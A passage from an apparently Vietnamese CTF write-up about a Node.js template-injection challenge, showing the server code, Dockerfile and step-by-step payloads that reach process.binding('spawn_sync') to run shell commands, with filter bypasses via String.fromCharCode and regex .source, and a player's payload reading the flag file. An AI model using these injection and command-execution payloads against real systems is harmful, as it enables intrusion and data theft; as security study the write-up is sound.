class="no-line-diff"></span></div><div class="code-content">  const params = await ctx.params();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  if (params.has("text")) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    return ctx.render({</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      inline: leetify(params.get("text"), params.get("dir")),</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      inlineLayout: layout,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    });</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  ctx.render({ inline: indexTemplate, inlineLayout: layout });</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">});</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app.get("/source", async (ctx) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  const readable = new Path("index.js").createReadStream();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  ctx.res.set("Content-Type", "text/plain");</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  await ctx.res.send(readable);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">});</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app.get("/docker", async (ctx) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  const readable = new Path("Dockerfile").createReadStream();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  ctx.res.set("Content-Type", "text/plain");</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  await ctx.res.send(readable);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">});</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app.start();</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Tiếp tục là một bài SSTI (được dịp ôn SSTI gớm), ở bài này nó sẽ convert một số ký tự từ chữ sang số và ngược lại.
      (btw, payload test ssti <code class="inline-code-block">&lt;%== 7*7%&gt;</code>
      ).
    </p>
    <p>
      Ngoài convert những kí tự như trên thì ở hàm <code class="inline-code-block">leetify</code>
      , tác giả còn chặn những kí tự như
      <code class="inline-code-block">&#39;</code>
      <code class="inline-code-block">&quot;</code>
      và ``` Tiếp cận bài này ban đầu của mình là mình đi theo hướng URLEncode nhưng không hợp lí vì lấy ví dụ
      <code class="inline-code-block">&#39;</code>
      là %27 thì số 7 đã bị block. Nhưng ta còn nhiều hướng khác ví dụ dùng
      <code class="inline-code-block">String.fromCharCode&lpar&rpar</code>
      và
      <code class="inline-code-block">/blabla/.source</code>
       để tạo chuỗi, vậy bắt tay làm nào.
    </p>
    <h2 id="huong-tiep-can"><a href="#huong-tiep-can">Hướng tiếp cận</a></h2>
    <p>
      Ở blog trước mình đã có tìm hiểu qua về bài nodejs kiểu vầy rồi, nên mới vào mình sẽ inject ngay 1 payload require <code
        class="inline-code-block">
        fs
      </code>
      và sử dụng
      <code class="inline-code-block">readdirSync</code>
       để đọc directory hiện tại, test ở terminal thì không hề hấn gì
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179691329-c76caeb1-927f-43d4-8601-fdda2d8d4cf9.png"
        alt="image" />
    </p>
    <p>Lên web thì...</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179691425-277edc1a-4158-4e76-8016-0a3d1103a005.png"
        alt="image" />
    </p>
    <p>
      Tới đây mình nghĩ là thằng <code class="inline-code-block">require</code>
       chắc đã không được define nên chương trình sẽ không chạy nó, định test thử như terminal như hình dưới thì trên web
      vẫn hiện như hình trên :)
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179692212-302eca1b-fa9b-4612-9e70-f751614fbcf6.png"
        alt="image" />
    </p>
    <p>
      Ngồi research một tí về cách làm, mình tìm thấy trang <a href="https://jwlss.pw/mathjs/" rel="external">này</a>
       .
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179692820-f11f3231-0e0b-4596-a2b3-46058ebadf04.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179693128-a747e0ea-54dc-4129-b324-73a613b1da59.png"
        alt="image" />
    </p>
    <p>
      Có thể dùng <code class="inline-code-block">process</code>
      thay thế cho
      <code class="inline-code-block">require</code>
      để dùng
      <code class="inline-code-block">fs</code>
      và đọc file, khá hợp lí trong ngữ cảnh bài này vì khi kiểm tra thử trên web thì
      <code class="inline-code-block">process</code>
       hoàn toàn đã được define
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;%= this.constructor.constructor(/return process/.source)()%&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179693610-4f04e1a6-f7dd-4c9a-bec1-dc653f7efde0.png"
        alt="image" />
    </p>
    <p>
      Tới đây tưởng chừng mọi chuyện đã êm trơn nhưng không, đọc lại Dockerfile thì thấy tên của file flag được đặt dựa
      trên $FLAG_FILENAME mà ta chưa biết là gì :)
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-Dockerfile">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"># syntax=docker/dockerfile:1</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">FROM node:18-alpine</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ENV NODE_ENV=production</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">WORKDIR /app</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">COPY ["package.json", "package-lock.json*", "./"]</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">RUN npm install --production</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">COPY index.js index.js</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">COPY Dockerfile Dockerfile</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">COPY public public</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ARG FLAG_FILENAME</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">COPY flag.txt &#36;FLAG_FILENAME</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">EXPOSE 3000</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">CMD ["node", "index.js", "server"]</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>Vậy chỉ còn hướng duy nhất là RCE.</p>
    <h2 id="rce-rce-rce-rce"><a href="#rce-rce-rce-rce">RCE RCE RCE RCE</a></h2>
    <p>Tiếp tục dựa trên link ở trên, ta được thông tin sau:</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179694331-e9a2ba1c-3b01-486d-b53f-02a6ae52bfd7.png"
        alt="image" />
    </p>
    <p>
      Ta có thể sử dụng <code class="inline-code-block">binding</code>
      để thay thế cho
      <code class="inline-code-block">child_process</code>
      như thường thấy vì
      <code class="inline-code-block">require</code>
      không thể dùng được, và nếu như mình không sai và dựa trên hình trên thì bản chất của
      <code class="inline-code-block">child_process</code>
      nó cũng dựa trên thằng
      <code class="inline-code-block">process.binding</code>
       này.
    </p>
    <p>
      Tới đây, khi tiếp tục tìm thêm thông tin về hướng làm này thì mình xem được write up <a
        href="https://blog.ssrf.kr/41"
        rel="external">
        này
      </a>
      . Trong đó có bài
      <code class="inline-code-block">Safe Evaluator</code>
       có cách tiếp cận và hướng làm y hệt, mình lấy tạm payload người ta và về debug :)).
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['bash','-c','ls'],stdio: [{type: 'pipe',readable: 1}]})</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179696473-9937724a-4b75-4cc0-9ead-51792b8f69bf.png"
        alt="image" />
    </p>
    <p>
      <code class="inline-code-block">output</code>
      ra null vì
      <code class="inline-code-block">pipe</code>
      hiện tại có thể ghi được nên ta thêm thuộc tính
      <code class="inline-code-block">writable</code>
       nữa là sẽ có output
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179696715-6eec623f-bce3-4a35-b548-f3c57ccdd2d5.png"
        alt="image" />
    </p>
    <p>
      Đã trả về buffer nhưng có gì đấy sai sai, những con số Hex encode từ lệnh <code class="inline-code-block">
        ls
      </code>
      đã đi đâu??? Mình chưa có câu trả lời cho câu hỏi này nhưng tới đây mình suy đoán rằng cái Buffer đang hiện ra chỉ
      là buffer trỏ vào thằng object
      <code class="inline-code-block">process.binding</code>
      , nên ta sẽ thêm vào 1 object nữa để trỏ tới cái
      <code class="inline-code-block">spawn</code>
      của lệnh
      <code class="inline-code-block">bin/bash</code>
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['bash','-c','ls'],stdio: [{type: 'pipe',readable: 1, writable: 1}, {type: 'pipe', writable: 1, readable: 1}]}).output</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179698411-37a3ea21-c5e3-4f37-bd68-316335b0a7c1.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179698475-05d3ebfa-aaaa-4535-aff8-f7055f558dca.png"
        alt="image" />
    </p>
    <p>Thứ ta mong đợi đã có, giờ thì chỉ cần chỉnh payload lại để né được filter để sử dụng lên web chính</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">process.binding(/spawn_sync/.source).spawn({file: String.fromCharCode(9+9+9+9+9+2,98,99+2+2+2,98+2+2+2+2+2+2,9+9+9+9+9+2,98,99-2,98+8+9,98+2+2+2),args: [/bash/.source,/-c/.source,/ls/.source],stdio: [{type: /pipe/.source,readable: 1, writable: 1}, {type: /pipe/.source, writable: 1, readable: 1}]}).output</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179701545-88bca9fc-facf-4953-b516-b5871df847c1.png"
        alt="image" />
    </p>
    <p>Đang vui vì biết nó sẽ ra thôi nhưng không :)</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179701242-eb666458-09e8-4ec3-a993-4e11d3ad7b17.png"
        alt="image" />
    </p>
    <p>Tới đây thì mình đã không giải được bài này...</p>
    <p>Sau khi vào discord của giải thì mình tìm được payload của 1 player có cách tiếp cận khá giống mình như sau</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">//@splitline#4881 </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;%= process.binding(/spawn_sync/.source).spawn({ file: (sh=&gt;/bin//sh).toString().slice(2+2), args: /sh,-c,cat F*/.source.split(/,/.source), stdio: [ { type: /pipe/.source, writable: true, readable: true }, { type: /pipe/.source, writable: true, readable: true } ] }).output %&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Thay vì dùng <code class="inline-code-block">bash</code>
      và dùng
      <code class="inline-code-block">1</code>
      thì anh/bạn này dùng
      <code class="inline-code-block">sh</code>
      và
      <code class="inline-code-block">true</code>
      , thử thay đổi những thứ này vào payload của mình thì đã chạy được
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;%=process.binding(/spawn_sync/.source).spawn({file: String.fromCharCode(9+9+9+9+9+2,98,99+2+2+2,98+2+2+2+2+2+2,9+9+9+9+9+2,98+8+9,98+2+2+2),args: [/sh/.source,/-c/.source,/ls/.source],stdio: [{type: /pipe/.source,readable: true, writable: true}, {type: /pipe/.source, writable: true, readable: true}]}).output%&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179706252-d51071dc-f5be-4325-9f9f-6f08c230056c.png"
        alt="image" />
    </p>
    <p>
      Mình thắc mắc về vấn đề này nên đã đi hỏi tác giả, thì biết rằng <code class="inline-code-block">bash</code>
       không được install :(, còn cái boolean kia là do phiên bản node của mình đã cũ...
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179706368-3f69a7ca-f009-470a-93da-f82ef928b8ad.png"
        alt="image" />
    </p>
    <p>Dù không giải được nhưng bài này khá hay vì đã giúp mình biết thêm một cách tiếp cận khi gặp những dạng này.</p>
    <p><em>Hết rồi</em></p>
  </article>
</Post>
